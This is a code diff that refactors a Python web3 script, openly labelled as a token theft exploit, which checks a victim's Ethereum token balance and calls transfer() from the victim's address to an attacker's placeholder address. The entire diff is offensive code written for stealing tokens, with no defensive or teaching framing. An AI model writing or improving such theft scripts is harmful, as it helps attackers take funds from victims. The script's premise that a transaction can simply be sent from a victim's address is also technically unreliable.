@@ -27,27 +27,48 @@ ABI = [
     }
 ]
 
-# Connect to the Ethereum network
-web3 = Web3(Web3.HTTPProvider(INFURA_URL))
-token_contract = web3.eth.contract(address=TOKEN_CONTRACT_ADDRESS, abi=ABI)
+# Connect to Ethereum network
+def connect_to_eth():
+    try:
+        web3 = Web3(Web3.HTTPProvider(INFURA_URL))
+        if web3.isConnected():
+            print("Connected to Ethereum network.")
+            return web3
+        else:
+            raise ConnectionError("Failed to connect to Ethereum network.")
+    except Exception as e:
+        print(f"Connection error: {e}")
+        exit(1)
 
-# Exploit the token theft vulnerability
-def exploit_token_theft():
+# Initialize contract
+def init_contract(web3):
+    return web3.eth.contract(address=TOKEN_CONTRACT_ADDRESS, abi=ABI)
+
+# Exploit token theft
+def exploit_token_theft(web3, token_contract):
     attacker_address = '0xAttackerAddress'
     victim_address = '0xVictimAddress'
     amount = 1000  # Amount of tokens to steal
 
-    # Step 1: Check the balance of the victim
-    victim_balance = token_contract.functions.balanceOf(victim_address).call()
-    print(f"Victim's balance: {victim_balance}")
-
-    # Step 2: Transfer tokens from the victim to the attacker's address (if allowed by contract)
+    # Check victim balance
     try:
-        tx = token_contract.functions.transfer(attacker_address, amount).transact({'from': victim_address})
-        web3.eth.waitForTransactionReceipt(tx)
-        print(f"Successfully transferred {amount} tokens to {attacker_address}.")
-    except Exception as e:
-        print("Token theft failed:", e)
+        victim_balance = token_contract.functions.balanceOf(victim_address).call()
+        print(f"Victim's balance: {victim_balance}")
 
-# Run the token theft attack
-exploit_token_theft()
+        if victim_balance < amount:
+            print("Insufficient balance for the theft.")
+            return
+
+        # Perform the transfer
+        tx = token_contract.functions.transfer(attacker_address, amount).transact({'from': victim_address})
+        receipt = web3.eth.wait_for_transaction_receipt(tx)
+        print(f"Successfully transferred {amount} tokens to {attacker_address}.")
+        print(f"Transaction receipt: {receipt}")
+        
+    except Exception as e:
+        print(f"Token theft failed: {e}")
+
+if __name__ == "__main__":
+    web3 = connect_to_eth()
+    token_contract = init_contract(web3)
+    exploit_token_theft(web3, token_contract)
